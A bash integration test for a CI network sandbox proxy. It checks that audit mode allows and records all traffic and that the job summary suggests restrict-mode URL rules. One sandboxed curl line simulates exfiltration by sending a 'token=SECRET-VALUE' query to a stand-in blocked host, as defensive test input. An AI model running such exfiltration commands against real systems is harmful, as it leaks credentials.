#!/bin/bash
# Audit-mode counterpart to integration-test-inspect-restrict.sh: with no
# rules configured, everything must be allowed and recorded, and the report
# must offer a restrict-mode allowed_url_rules example built from what was
# actually observed -- ported from buildcage/docker's
# test/Dockerfile.inspect-audit + test/assert-inspect-audit.sh.
set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
FAILURES=0

: "${BUILDCAGE_LOCAL_IMAGE_REF:?BUILDCAGE_LOCAL_IMAGE_REF must be set to a locally built inspect-engine image (BUILDCAGE_TEST_HOOKS=1 PROXY_ENGINE=inspect docker compose build proxy)}"

pass() { echo "  PASS  $1"; }
fail() {
  echo "  FAIL  $1"
  FAILURES=$((FAILURES + 1))
}

echo ""
echo "=== Inspect Engine Integration Test (audit) ==="
echo ""

echo "--- bringing up fixture origins (compose.test-inspect.yaml) ---"
cleanup() {
  docker compose -f "$REPO_ROOT/compose.test-inspect.yaml" down -v >/dev/null 2>&1 || true
}
trap cleanup EXIT
docker compose -f "$REPO_ROOT/compose.test-inspect.yaml" up -d --build --wait

TMPDIR=$(mktemp -d)
touch "$TMPDIR/state.env"
SUMMARY_FILE="$TMPDIR/summary.md"
touch "$SUMMARY_FILE"

echo "--- running the sandboxed step (proxy_engine: inspect, audit mode) ---"
GITHUB_WORKSPACE="$TMPDIR" \
GITHUB_STATE="$TMPDIR/state.env" \
GITHUB_STEP_SUMMARY="$SUMMARY_FILE" \
BUILDCAGE_RUN_DEBUG_SUMMARY_FILE="$SUMMARY_FILE" \
BUILDCAGE_LOCAL_IMAGE_REF="$BUILDCAGE_LOCAL_IMAGE_REF" \
BUILDCAGE_TEST_COMPOSE_FILE="$REPO_ROOT/docker/compose.action.test-inspect.yaml" \
BUILDCAGE_TEST_CERT_PATH="$REPO_ROOT/test/test-server-inspect/cert.pem" \
EXTERNAL_RESOLVER="10.200.0.53" \
INPUT_PROXY_ENGINE="inspect" \
INPUT_PROXY_MODE="audit" \
INPUT_RUN="
S='curl -sS --max-time 10'
\$S https://allowed.example.com/public/pkg.tgz
\$S -X POST https://api.example.com/v1/thing
\$S https://blocked.example.com/exfil?token=SECRET-VALUE
true" \
  node "$REPO_ROOT/dist/main.cjs" > "$TMPDIR/out.log" 2>&1
RUN_EXIT=$?
cat "$TMPDIR/out.log"

echo ""
echo "--- exit code: $RUN_EXIT ---"
if [ "$RUN_EXIT" = "0" ]; then
  pass "audit mode enforced nothing, so the step succeeded"
else
  fail "the step failed in audit mode (should never refuse anything)"
fi

echo ""
echo "--- report assertions (Job Summary) ---"
SUMMARY=$(cat "$SUMMARY_FILE")

assert_summary_contains() {
  local pattern="$1" label="$2"
  if grep -qF -- "$pattern" <<< "$SUMMARY"; then
    pass "$label"
  else
    fail "$label -- not found in report"
  fi
}

assert_summary_contains "📋 Audited Hosts" "audited-hosts heading present"
assert_summary_contains "| allowed.example.com:443 | HTTPS |" "allowed.example.com:443 audited"
assert_summary_contains "| blocked.example.com:443 | HTTPS |" "blocked.example.com:443 audited (nothing enforced)"
if grep -qF "🚫 Blocked Hosts" <<< "$SUMMARY"; then
  fail "audit mode produced a Blocked Hosts table"
else
  pass "no Blocked Hosts table in audit mode"
fi
assert_summary_contains "Switch to restrict mode" "restrict-mode example offered"
assert_summary_contains "proxy_engine: inspect" "restrict-mode example names the inspect engine"
assert_summary_contains "allowed_url_rules: |" "restrict-mode example is offered as URL rules"
assert_summary_contains "GET https://allowed.example.com/public/pkg.tgz" "the example includes what was actually observed"
assert_summary_contains "POST https://api.example.com/v1/thing" "the example keeps the method it actually saw"
assert_summary_contains "GET https://blocked.example.com/exfil" "the example includes a host audit merely observed, for the reader to remove"

rm -rf "$TMPDIR"

echo ""
if [ "$FAILURES" -gt 0 ]; then
  echo "❌ FAILED: $FAILURES assertion(s) failed"
  exit 1
fi
echo "✅ All assertions passed."
echo ""
